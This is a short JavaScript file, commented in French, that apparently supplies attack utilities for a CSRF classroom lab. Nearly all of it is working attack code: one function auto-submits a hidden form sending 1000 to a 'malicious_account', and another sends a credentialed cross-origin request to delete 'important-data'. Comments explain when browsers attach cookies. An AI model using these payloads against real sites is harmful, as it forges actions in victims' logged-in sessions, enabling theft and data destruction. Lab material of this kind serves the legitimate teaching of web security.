// attacker.js
// Utilitaires d'attaque pour le TP CSRF

function submitForm(actionUrl) {
  const form = document.createElement('form');
  form.method = 'POST';
  form.action = actionUrl;

  const input1 = document.createElement('input');
  input1.type = 'hidden';
  input1.name = 'amount';
  input1.value = '1000';
  form.appendChild(input1);

  const input2 = document.createElement('input');
  input2.type = 'hidden';
  input2.name = 'to_account';
  input2.value = 'malicious_account';
  form.appendChild(input2);

  document.body.appendChild(form);
  form.submit();
}

// attacker utilities
// - submitForm(actionUrl): crée et soumet un formulaire POST (méthode CSRF classique)
// - sendXhr(actionUrl, cb): envoie une requête XHR; accepte un callback (status, responseText)
//
// Note sur withCredentials / CORS : pour que le navigateur envoie les cookies sur une requête XHR
// cross-origin il faut définir `xhr.withCredentials = true` et le serveur cible doit autoriser
// les credentials via CORS (Access-Control-Allow-Credentials: true) et autoriser l'origine.
// Sans cela, XHR cross-origin n'enverra pas les cookies — le formulaire auto‑soumis reste la méthode
// la plus simple et la plus fiable pour démontrer CSRF.

function sendXhr(actionUrl, cb) {
  var xhr = new XMLHttpRequest();
  xhr.open('POST', actionUrl, true);
  // Demander l'envoi des cookies (requiert CORS côté serveur pour fonctionner)
  xhr.withCredentials = true;
  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
  xhr.onreadystatechange = function() {
    if (xhr.readyState === 4) {
      if (typeof cb === 'function') {
        cb(xhr.status, xhr.responseText);
      }
    }
  };
  xhr.send('action=delete&target=important-data');
}

// Expose to global
window.attacker = { submitForm, sendXhr };
